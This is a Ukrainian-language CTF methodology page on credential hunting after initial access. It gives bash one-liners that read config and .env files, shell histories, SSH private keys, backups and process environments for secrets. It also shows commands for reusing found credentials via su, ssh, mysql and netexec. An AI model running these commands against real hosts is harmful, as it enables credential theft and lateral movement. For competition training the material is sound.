# Workflow: Credential Hunting

**Для чого:** знайти логіни/паролі/ключі — головне паливо латерального руху в цьому CTF.
**Коли:** є будь-який доступ (файли/shell/БД).
← [post-exploitation](../01-roadmaps/post-exploitation.md) · [lateral-movement](lateral-movement.md) · [credentials reuse](../04-techniques/credentials-reuse.md)

---

## Де шукати (за віддачею)
```bash
# 1. Конфіги додатків (БД-креди найчастіше тут)
grep -rEi 'passw|secret|api[_-]?key|token|DB_|mysql' /var/www /opt /srv /etc 2>/dev/null | grep -v Binary
cat /var/www/html/config.php /var/www/html/wp-config.php 2>/dev/null
find / -name '.env' 2>/dev/null -exec cat {} \;          # зразок флагу: d0t3nv_scr33n_l34k

# 2. Історії команд (паролі в аргументах)
cat ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.*_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null

# 3. SSH-ключі
find / -name 'id_rsa*' -o -name 'id_ed25519*' 2>/dev/null
cat ~/.ssh/id_rsa /home/*/.ssh/id_rsa 2>/dev/null
cat ~/.ssh/authorized_keys /home/*/.ssh/known_hosts 2>/dev/null

# 4. Бекапи, дампи, логи
find / \( -name '*.bak' -o -name '*.sql' -o -name '*.old' -o -name '*.sql.gz' \) 2>/dev/null
ls -la /var/backups 2>/dev/null

# 5. Env змінних процесів
env; cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -Ei 'pass|key|token'
```

## Типові файли з кредами
| Додаток | Файл |
|---|---|
| PHP-сайт | `config.php`, `db.php`, `settings.php` |
| WordPress | `wp-config.php` |
| Laravel / Node | `.env` |
| Django | `settings.py` |
| Tomcat | `tomcat-users.xml` |
| Git-репо | `.git/config`, історія комітів (зразок `g1t_c0mm1tt3d_s3cr3t`) |
| phpMyAdmin / DB | дамп `.sql` |

## Що робити зі знайденим (ключове)
> Знайдений пароль/ключ → перевірити **скрізь**: SSH, інші юзери (`su`), DB, SMB, веб-панель.
```bash
su anotheruser            # той самий пароль?
ssh -i id_rsa user@$TARGET
mysql -u root -p'<знайдений_пароль>'
netexec smb $TARGET -u <user> -p '<пароль>'
```
→ повний алгоритм перевикористання: [credentials reuse](../04-techniques/credentials-reuse.md) → [lateral-movement](lateral-movement.md)

## Інтерпретація
- Пароль у `config.php` для БД часто = пароль системного юзера (reuse).
- `id_rsa` без паролю → прямий `ssh -i`.
- Хеш (`$6$...`, `$1$...`) → офлайн-крек `john` лише якщо швидко; інакше plaintext шукати деінде.

## Фіксація
Кожен логін:пароль / ключ → [findings-tracker](../07-koth-strategy/findings-tracker.md) з позначкою «де знайдено / де спрацював».
